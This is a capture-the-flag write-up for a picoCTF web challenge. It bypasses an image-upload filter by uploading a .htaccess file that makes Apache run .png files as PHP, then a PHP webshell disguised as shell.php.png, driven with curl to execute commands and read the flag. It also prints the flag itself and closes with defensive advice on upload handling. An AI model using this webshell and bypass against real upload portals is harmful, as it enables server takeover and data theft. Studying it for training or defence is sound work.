# File Upload Bypass — picoCTF Writeup

## Challenge Info

| Field       | Details                                        |
|-------------|------------------------------------------------|
| Name        | File Upload Bypass                             |
| Category    | Web Exploitation                               |
| Platform    | picoCTF                                        |
| URL         | `http://amiable-citadel.picoctf.net:53117/`    |

**Description:**
A university's online registration portal asks students to upload their ID cards for verification. The developer put some filters in place to ensure only image files are uploaded but are they enough? Take a look at how the upload is implemented. Maybe there's a way to slip past the checks and interact with the server in ways you shouldn't.

---

## Solution

### Step 1: Explore the Upload Form

The website is a student ID verification portal that accepts image uploads (JPG, PNG, GIF). The form posts to `upload.php` and uploaded files are stored in the `/images/` directory.

```bash
curl -s http://amiable-citadel.picoctf.net:53117/
```

---

### Step 2: Test the Filters

First, let's figure out what's blocked and what's allowed:

```bash
# Direct .php upload — BLOCKED
echo '<?php echo shell_exec($_GET["cmd"]); ?>' > shell.php
curl -s -X POST http://amiable-citadel.picoctf.net:53117/upload.php \
  -F "image=@shell.php;type=image/png"
# Result: Not allowed!

# .phtml — BLOCKED
# .php.png (double extension) — ALLOWED but not executed as PHP
# .phar, .php5, .php7, .pht — ALLOWED but not executed as PHP
# .htaccess — ALLOWED!
```

The filter blocks `.php` and `.phtml` extensions but allows everything else — including `.htaccess`.

---

### Step 3: Upload a Malicious .htaccess

`.htaccess` is an Apache configuration file that can override server settings on a per-directory basis. We can upload one that tells Apache to treat `.png` files as PHP:

```bash
printf 'AddType application/x-httpd-php .png' > .htaccess
curl -s -X POST http://amiable-citadel.picoctf.net:53117/upload.php \
  -F "image=@.htaccess;type=image/png"
```

```
Successfully uploaded!
Access it at: images/.htaccess
```

Now any `.png` file in the `/images/` directory will be executed as PHP by Apache.

---

### Step 4: Upload a PHP Webshell as .png

```bash
echo '<?php echo shell_exec($_GET["cmd"]); ?>' > shell.php.png
curl -s -X POST http://amiable-citadel.picoctf.net:53117/upload.php \
  -F "image=@shell.php.png"
```

```
Successfully uploaded!
Access it at: images/shell.php.png
```

The file passes the filter because its extension ends with `.png`. But thanks to our `.htaccess`, Apache will execute it as PHP.

---

### Step 5: Remote Code Execution

Test command execution:

```bash
curl -s "http://amiable-citadel.picoctf.net:53117/images/shell.php.png?cmd=id"
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Find and read the flag:

```bash
curl -s "http://amiable-citadel.picoctf.net:53117/images/shell.php.png?cmd=find+/+-name+flag*+-type+f+2>/dev/null"
# /var/www/flag.txt

curl -s "http://amiable-citadel.picoctf.net:53117/images/shell.php.png?cmd=cat+/var/www/flag.txt"
# picoCTF{s3rv3r_byp4ss_9e7008ba}
```

---

## Flag

```
picoCTF{s3rv3r_byp4ss_9e7008ba}
```

---

## Attack Chain Summary

```
Upload .htaccess (AddType application/x-httpd-php .png)
        ↓
Upload shell.php.png (PHP webshell with .png extension)
        ↓
Apache reads .htaccess → treats .png as PHP
        ↓
shell.php.png executes as PHP → Remote Code Execution
        ↓
cat /var/www/flag.txt → Flag
```

---

## Key Takeaways

1. **Block .htaccess uploads.** If an attacker can upload a `.htaccess` file, they can override Apache's configuration for that directory — including which file types get executed as code. Always include `.htaccess` in your upload blocklist, or better yet, use an allowlist approach.

2. **Use an allowlist, not a blocklist.** The filter blocked `.php` and `.phtml` but missed `.htaccess` and many other dangerous extensions. A secure upload filter should only allow specific known-safe extensions (e.g., `.jpg`, `.png`, `.gif`) and reject everything else.

3. **Don't store uploads in web-accessible directories.** Uploaded files should be stored outside the web root or in a directory where script execution is disabled at the server configuration level (not via `.htaccess`). This way, even if a malicious file is uploaded, it cannot be executed.

4. **Defense in depth for file uploads:**
   - Allowlist file extensions (`.jpg`, `.png`, `.gif` only)
   - Validate MIME type AND file content (magic bytes)
   - Rename uploaded files to random names
   - Store uploads outside the web root
   - Disable script execution in upload directories via server config
   - Block `.htaccess`, `.user.ini`, and other config file uploads
